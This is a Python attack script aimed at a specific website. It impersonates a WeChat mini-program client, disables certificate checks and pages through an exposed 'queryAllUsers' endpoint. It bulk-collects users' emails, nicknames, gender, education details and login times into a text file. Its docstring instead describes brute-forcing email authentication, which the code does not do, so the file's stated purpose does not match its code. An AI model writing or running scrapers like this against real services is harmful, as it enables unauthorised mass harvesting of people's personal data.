'''
F88K email authentication.

Brute force for validation, you may not pass the validation if your device cannot send enough request.
Ajust the threads number, the email and userId.
'''

import json
import time

import requests

requests.packages.urllib3.disable_warnings()
base_url = "https://www.jumboxtech.com:8022/user/queryAllUsers"
header = {
    'Host': 'www.jumboxtech.com:8022',
    'Connection': 'keep-alive',
    # 'Content-Length': '39',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; GM1900 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Safari/537.36 MMWEBID/9558 MicroMessenger/8.0.2.1860(0x28000234) Process/appbrand0 WeChat/arm32 Weixin Android Tablet NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
    'charset': 'utf-8',
    'Accept-Encoding': 'gzip,compress,br,deflate',
    'content-type': 'application/x-www-form-urlencoded',
    'Referer': 'https://servicewechat.com/wxf7f31446cd68367a/5/page-frame.html',
}

s = requests.session()
s.keep_alive = False

userList = []
for num in range(1, 64):
    payload = f'page={num}&pageSize=50'
    req = s.post(base_url, headers=header, data=payload, verify=False)
    print(req.content.decode(encoding='utf-8'))
    ob = json.loads(req.content.decode(encoding='utf-8'))

    # time.sleep(1)
    if ob.get('error') is not None:
        print(ob.get('error'))
        continue
    if ob['data']['records'] == 0:
        print('!!!')
        break
    else:
        print('---')
        for i in ob['data']['rows']:
            id = i['id']
            email = i['email']
            nickname = i['nickname']
            signature = i['signature']
            createDate = i['createDate']
            faceImg = i['faceImg']
            faceImgThumb = i['faceImgThumb']
            followNum = i['followNum']
            fansNum = i['fansNum']
            gender = i['gender']
            major = i['major']
            graduationYear = i['graduationYear']
            degree = i['degree']
            receiveLikeCounts = i['receiveLikeCounts']
            state = i['state']
            cid = i['cid']
            reputation = i['reputation']
            latestLogin = i['latestLogin']
            authType = i['authType']
            follow = i['follow']

            userList.append([id, email, nickname, signature, createDate, faceImg, faceImgThumb, followNum,
                             fansNum, gender, major, graduationYear, degree, receiveLikeCounts, state, cid,
                             reputation, latestLogin, authType, follow])

print(userList)
with open('userList.txt', 'w+', encoding='utf-8') as f:
    for i in userList:
        f.write(str(i).replace('[', '').replace(']','') + '\n')


